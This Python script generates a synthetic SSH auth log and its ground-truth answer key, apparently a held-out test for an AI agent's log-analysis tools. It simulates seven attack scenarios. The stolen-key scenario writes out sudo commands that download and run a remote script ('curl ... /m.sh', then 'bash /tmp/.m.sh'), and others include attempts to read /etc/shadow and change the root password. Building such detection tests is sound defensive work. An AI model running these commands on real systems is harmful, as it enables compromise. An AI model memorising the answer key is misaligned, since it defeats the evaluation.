"""Generate the held-out SSH log and its ground truth.

A different company from samples/auth.log, with formats and attacks the agent
has never seen. The ground truth is computed here, from what is written into
the log, independently of tools.py, so tool bugs can't leak into the expected
answers.

    python samples/generate_holdout.py

writes samples/holdout_auth.log and samples/holdout_truth.json.
"""

import ipaddress
import json
import random
from collections import Counter, defaultdict
from datetime import datetime, timedelta
from pathlib import Path

random.seed(2026)

OUT_DIR = Path(__file__).resolve().parent
HOST = "app-srv02"
START = datetime(2026, 12, 1)
DAYS = 3
INTERNAL_NETWORKS = ["192.168.0.0/16", "172.16.0.0/12"]

lines = []      # (timestamp, sequence, text)
attempts = []   # every authentication attempt: the source of the ground truth
sudo_log = []   # every sudo command
_seq = [0]
_pid = [4000]
_uids = {}


def pid():
    _pid[0] += random.randint(1, 30)
    return _pid[0]


def port():
    return random.randint(32768, 65535)


def uid(user):
    return _uids.setdefault(user, 2000 + len(_uids))


def add(ts, proc, msg):
    _seq[0] += 1
    lines.append((ts, _seq[0], f"{proc}: {msg}"))


def record(ts, ip, user, result, method, invalid=False):
    attempts.append({"ts": ts, "ip": ip, "user": user, "result": result, "method": method, "invalid": invalid})


# --- Log line writers ----------------------------------------------------------

def fail_password(ts, user, ip, invalid=False):
    p, pt = pid(), port()
    if invalid:
        add(ts, f"sshd[{p}]", f"Invalid user {user} from {ip} port {pt}")
        add(ts + timedelta(seconds=2), f"sshd[{p}]", f"Failed password for invalid user {user} from {ip} port {pt} ssh2")
    else:
        add(ts + timedelta(seconds=1), f"sshd[{p}]",
            f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user={user}")
        add(ts + timedelta(seconds=2), f"sshd[{p}]", f"Failed password for {user} from {ip} port {pt} ssh2")
    if random.random() < 0.3:
        kind = "invalid" if invalid else "authenticating"
        add(ts + timedelta(seconds=3), f"sshd[{p}]", f"Disconnected from {kind} user {user} {ip} port {pt} [preauth]")
    record(ts + timedelta(seconds=2), ip, user, "failed", "password", invalid)


def fail_repeated(ts, user, ip, times):
    """rsyslog collapses identical consecutive lines into 'message repeated N times'."""
    p, pt = pid(), port()
    add(ts, f"sshd[{p}]", f"Failed password for {user} from {ip} port {pt} ssh2")
    add(ts + timedelta(seconds=3 * times), f"sshd[{p}]",
        f"message repeated {times - 1} times: [ Failed password for {user} from {ip} port {pt} ssh2]")
    for i in range(times):
        record(ts + timedelta(seconds=3 * i), ip, user, "failed", "password")


def fail_publickey(ts, user, ip):
    p, pt = pid(), port()
    key = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", k=43))
    add(ts, f"sshd[{p}]", f"Failed publickey for {user} from {ip} port {pt} ssh2: RSA SHA256:{key}")
    record(ts, ip, user, "failed", "publickey")


METHOD_TEXT = {"password": "password", "publickey": "publickey", "keyboard-interactive": "keyboard-interactive/pam"}


def session(ts, user, ip, method, minutes, sudo=(), denied=()):
    p, pt = pid(), port()
    suffix = ""
    if method == "publickey":
        suffix = ": ED25519 SHA256:" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=43))
    add(ts, f"sshd[{p}]", f"Accepted {METHOD_TEXT[method]} for {user} from {ip} port {pt} ssh2{suffix}")
    add(ts, f"sshd[{p}]", f"pam_unix(sshd:session): session opened for user {user}(uid={uid(user)}) by (uid=0)")
    record(ts, ip, user, "accepted", method)

    commands = [(c, None) for c in sudo] + [(c, "user NOT in sudoers") for c in denied]
    for i, (cmd, error) in enumerate(commands):
        t = ts + timedelta(seconds=int((i + 1) * minutes * 60 / (len(commands) + 1)))
        prefix = f"{user} : {error} ; " if error else f"{user} : "
        add(t, "sudo", f"   {prefix}TTY=pts/{random.randint(0, 6)} ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}")
        sudo_log.append({"ts": t, "user": user, "ip": ip, "command": cmd, "denied": error is not None})

    end = ts + timedelta(minutes=minutes, seconds=random.randint(0, 59))
    add(end, f"sshd[{p}]", f"Received disconnect from {ip} port {pt}:11: disconnected by user")
    add(end, f"sshd[{p}]", f"pam_unix(sshd:session): session closed for user {user}")


def at(day, hour, minute=0, second=0):
    return START + timedelta(days=day, hours=hour, minutes=minute, seconds=second)


# --- The company ---------------------------------------------------------------

FIRST = ["james", "mary", "robert", "patricia", "john", "jennifer", "michael", "linda", "david", "elizabeth",
         "william", "barbara", "richard", "susan", "joseph", "jessica", "thomas", "sarah", "charles", "karen",
         "daniel", "lisa", "matthew", "nancy", "anthony", "betty", "mark", "sandra", "steven", "ashley"]
LAST = ["smith", "jones", "miller", "moore", "white", "harris", "martin", "thompson", "lewis", "walker",
        "hall", "allen", "young", "king", "wright", "scott", "green", "baker", "adams", "nelson"]
SCENARIO_USERS = ["emma.wilson", "liam.brown", "olivia.davis", "noah.taylor", "mason.clark", "ava.johnson"]

employees = list(SCENARIO_USERS)
while len(employees) < 80:
    name = f"{random.choice(FIRST)}.{random.choice(LAST)}"
    if name not in employees:
        employees.append(name)

office_ip = {u: f"192.168.{random.randint(10, 20)}.{random.randint(20, 240)}" for u in employees}
vpn_ip = {u: f"172.16.5.{random.randint(10, 250)}" for u in employees}
ADMINS = {"it.admin", "james.smith", "mary.jones"}
for admin in ("james.smith", "mary.jones"):
    if admin not in employees:
        employees.append(admin)
        office_ip[admin] = f"192.168.11.{random.randint(20, 240)}"
        vpn_ip[admin] = f"172.16.5.{random.randint(10, 250)}"

SERVICE = {"jenkins": "192.168.1.50", "pgbackup": "192.168.1.60", "nagios": "192.168.1.70", "it.admin": "192.168.1.10"}
EXISTING = set(employees) | set(SERVICE) | {"root"}


# --- Normal activity -----------------------------------------------------------

for day in range(DAYS):
    for user in employees:
        if user in SCENARIO_USERS[:3] or random.random() > 0.75:
            continue
        for _ in range(random.choice([1, 1, 2])):
            ts = at(day, random.choice([8, 9, 9, 10, 11, 14, 15, 16, 17]), random.randint(0, 59), random.randint(0, 59))
            remote = random.random() < 0.3
            ip = vpn_ip[user] if remote else office_ip[user]
            method = "keyboard-interactive" if remote else random.choice(["password", "password", "publickey"])
            if random.random() < 0.07:
                for k in range(random.randint(1, 2)):
                    fail_password(ts - timedelta(seconds=15 * (k + 1)), user, ip)
            sudo = random.sample(["/usr/bin/systemctl status webapp", "/usr/bin/journalctl -u webapp -n 50",
                                  "/usr/bin/apt list --upgradable"], 1) if user in ADMINS else ()
            session(ts, user, ip, method, random.randint(5, 180), sudo=sudo)

    for hour in (8, 13, 18):
        session(at(day, hour, random.randint(0, 20)), "it.admin", SERVICE["it.admin"], "publickey",
                random.randint(5, 30), sudo=["/usr/bin/apt-get update"] if hour == 8 else ())
    for hour in range(8, 21, 2):
        session(at(day, hour, 5, random.randint(0, 30)), "jenkins", SERVICE["jenkins"], "publickey", 3,
                sudo=["/usr/bin/systemctl restart webapp"])
    session(at(day, 1, 30), "pgbackup", SERVICE["pgbackup"], "publickey", 25, sudo=["/usr/local/bin/pg_backup.sh"])
    for half_hour in range(48):
        session(at(day, 0, 30 * half_hour, 2), "nagios", SERVICE["nagios"], "publickey", 0)
    for ten in range(144):
        p = pid()
        add(at(day, 0, 10 * ten, 1), f"CRON[{p}]", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
        add(at(day, 0, 10 * ten, 2), f"CRON[{p}]", "pam_unix(cron:session): session closed for user root")

# Internet scanners: a few attempts each, some with public keys.
SCANNER_USERS = ["root", "admin", "test", "ubuntu", "oracle", "git", "user", "ftp", "pi", "support"]
for _ in range(120):
    ip = f"{random.choice([31, 46, 62, 77, 89, 101, 118, 125, 149, 176, 185, 196, 212])}." \
         f"{random.randint(1, 254)}.{random.randint(0, 254)}.{random.randint(1, 254)}"
    ts = START + timedelta(seconds=random.randint(0, DAYS * 86400 - 3600))
    for k in range(random.randint(1, 6)):
        user = random.choice(SCANNER_USERS)
        fail_password(ts + timedelta(seconds=20 * k), user, ip, invalid=user not in EXISTING)
publickey_scanners = []
for _ in range(6):
    ip = f"{random.choice([45, 80, 157])}.{random.randint(1, 254)}.{random.randint(0, 254)}.{random.randint(1, 254)}"
    publickey_scanners.append(ip)
    ts = START + timedelta(seconds=random.randint(0, DAYS * 86400 - 3600))
    for k in range(random.randint(2, 4)):
        fail_publickey(ts + timedelta(seconds=5 * k), random.choice(["git", "ubuntu", "root"]), ip)


# --- Attack scenarios ------------------------------------------------------------

# S1 IPv6 brute force against root, mostly collapsed by rsyslog.
IPV6 = "2001:db8:4f3a:12::17"
ts = at(0, 22, 10)
for _ in range(120):
    fail_repeated(ts, "root", IPV6, 5)
    ts += timedelta(seconds=random.randint(16, 30))

# S2 dictionary attack, no success.
DICT_IP = "198.51.100.23"
DICT_USERS = ["admin", "administrator", "ubuntu", "test", "oracle", "postgres", "mysql", "git", "deploy", "backup",
              "jenkins", "nagios", "guest", "support", "www-data", "ftpuser", "elastic", "redis", "minecraft", "pi"]
ts = at(1, 4, 0)
for _ in range(350):
    user = random.choice(DICT_USERS)
    fail_password(ts, user, DICT_IP, invalid=user not in EXISTING)
    ts += timedelta(seconds=random.randint(3, 9))

# S3 credential stuffing: one or two tries per employee account, three succeed.
STUFF_IP = "203.0.113.140"
STUFF_WINS = {"emma.wilson": ["/bin/cat /etc/shadow"], "liam.brown": [], "olivia.davis": []}
stuff_targets = random.sample([u for u in employees if u not in SCENARIO_USERS and u not in ADMINS], 22) + list(STUFF_WINS)
random.shuffle(stuff_targets)
ts = at(1, 13, 0)
for user in stuff_targets:
    if user in STUFF_WINS:
        session(ts, user, STUFF_IP, "password", random.randint(4, 12), denied=STUFF_WINS[user])
    else:
        for _ in range(random.choice([1, 2])):
            fail_password(ts, user, STUFF_IP)
            ts += timedelta(seconds=random.randint(20, 50))
    ts += timedelta(seconds=random.randint(30, 90))

# S4 stolen SSH key: jenkins logs in from outside, no failed attempt at all.
STOLEN_IP = "198.51.100.77"
STOLEN_CMDS = ["/usr/bin/curl -s http://198.51.100.77/m.sh -o /tmp/.m.sh", "/bin/bash /tmp/.m.sh",
               "/usr/bin/crontab -l"]
session(at(1, 3, 12, 40), "jenkins", STOLEN_IP, "publickey", 14, sudo=STOLEN_CMDS)

# S5 employee logging in at night from a foreign IP after one typo.
FOREIGN_IP = "192.0.2.88"
fail_password(at(2, 2, 46, 30), "noah.taylor", FOREIGN_IP)
session(at(2, 2, 47, 10), "noah.taylor", FOREIGN_IP, "password", 22)

# S6 insider: an internal employee repeatedly denied sudo.
INSIDER_CMDS = ["/bin/su -", "/bin/cat /etc/shadow", "/usr/bin/passwd root", "/bin/bash"]
session(at(1, 15, 2), "mason.clark", office_ip["mason.clark"], "password", 40, denied=INSIDER_CMDS)

# S7 locked-out employee on the VPN.
ts = at(2, 9, 3)
for _ in range(6):
    fail_password(ts, "ava.johnson", vpn_ip["ava.johnson"])
    ts += timedelta(seconds=random.randint(10, 30))
session(at(2, 9, 41), "ava.johnson", vpn_ip["ava.johnson"], "password", 120)


# --- Write the log -----------------------------------------------------------------

lines.sort()
with open(OUT_DIR / "holdout_auth.log", "w") as f:
    for ts, _, text in lines:
        f.write(f"{ts.strftime('%b')} {ts.day:>2} {ts.strftime('%H:%M:%S')} {HOST} {text}\n")


# --- Ground truth --------------------------------------------------------------------

def is_internal(ip):
    addr = ipaddress.ip_address(ip)
    return any(addr in ipaddress.ip_network(n) for n in INTERNAL_NETWORKS)


def iso(ts):
    return ts.isoformat()


failed = [a for a in attempts if a["result"] == "failed"]
accepted = [a for a in attempts if a["result"] == "accepted"]
failures_by_ip = Counter(a["ip"] for a in failed)
users_by_ip = defaultdict(set)
for a in failed:
    users_by_ip[a["ip"]].add(a["user"])
external_logins = sorted((a for a in accepted if not is_internal(a["ip"])), key=lambda a: a["ts"])
stuff_failed = [a for a in failed if a["ip"] == STUFF_IP]

truth = {
    "log": "samples/holdout_auth.log",
    "internal_networks": INTERNAL_NETWORKS,
    "totals": {
        "lines": len(lines),
        "failed_attempts": len(failed),
        "failed_password": sum(a["method"] == "password" for a in failed),
        "failed_publickey": sum(a["method"] == "publickey" for a in failed),
        "successful_logins": len(accepted),
        "ips_with_failures": len(failures_by_ip),
        "first_attempt": iso(min(a["ts"] for a in attempts)),
        "last_attempt": iso(max(a["ts"] for a in attempts)),
    },
    "top_failed_ips": [[ip, n] for ip, n in failures_by_ip.most_common(10)],
    "logins_by_method": dict(Counter(a["method"] for a in accepted)),
    "keyboard_interactive_logins": sum(a["method"] == "keyboard-interactive" for a in accepted),
    "external_logins": [{"ts": iso(a["ts"]), "user": a["user"], "ip": a["ip"], "method": a["method"]}
                        for a in external_logins],
    "publickey_failures": [{"ip": ip, "users": sorted({a["user"] for a in failed if a["ip"] == ip and a["method"] == "publickey"}),
                            "attempts": sum(1 for a in failed if a["ip"] == ip and a["method"] == "publickey")}
                           for ip in publickey_scanners],
    "subnet_attacks": [],  # no /24 subnet with several attacking IPs in this log
    "scenarios": {
        "ipv6_bruteforce": {"ip": IPV6, "user": "root", "attempts": failures_by_ip[IPV6], "logged_in": False},
        "dictionary": {"ip": DICT_IP, "attempts": failures_by_ip[DICT_IP], "distinct_users": len(users_by_ip[DICT_IP]),
                       "existing_users_tried": sorted(users_by_ip[DICT_IP] & EXISTING)},
        "credential_stuffing": {"ip": STUFF_IP, "accounts_tried": len(stuff_targets),
                                "compromised": sorted(STUFF_WINS), "failed_attempts": len(stuff_failed),
                                "first_login": iso(min(a["ts"] for a in accepted if a["ip"] == STUFF_IP)),
                                "sudo_denied": [{"user": u, "command": c} for u, cs in STUFF_WINS.items() for c in cs]},
        "stolen_key": {"ip": STOLEN_IP, "user": "jenkins", "usual_ip": SERVICE["jenkins"], "method": "publickey",
                       "time": iso(at(1, 3, 12, 40)), "prior_failures": 0, "commands": STOLEN_CMDS},
        "foreign_login": {"ip": FOREIGN_IP, "user": "noah.taylor", "time": iso(at(2, 2, 47, 10)), "prior_failures": 1},
        "insider_sudo": {"user": "mason.clark", "ip": office_ip["mason.clark"], "denied": len(INSIDER_CMDS),
                         "commands": INSIDER_CMDS},
        "locked_out": {"user": "ava.johnson", "ip": vpn_ip["ava.johnson"], "failures": 6, "login": iso(at(2, 9, 41))},
    },
    "accounts": {
        "nagios": {"ip": SERVICE["nagios"], "logins": sum(a["user"] == "nagios" for a in accepted)},
        "pgbackup": {"ip": SERVICE["pgbackup"], "logins": sum(a["user"] == "pgbackup" for a in accepted),
                     "commands": sorted({s["command"] for s in sudo_log if s["user"] == "pgbackup"})},
        "jenkins": {"usual_ip": SERVICE["jenkins"],
                    "ips": sorted({a["ip"] for a in accepted if a["user"] == "jenkins"})},
    },
}

(OUT_DIR / "holdout_truth.json").write_text(json.dumps(truth, indent=2) + "\n")
print(f"{len(lines)} lines -> {OUT_DIR / 'holdout_auth.log'}")
print(json.dumps(truth["totals"], indent=2))
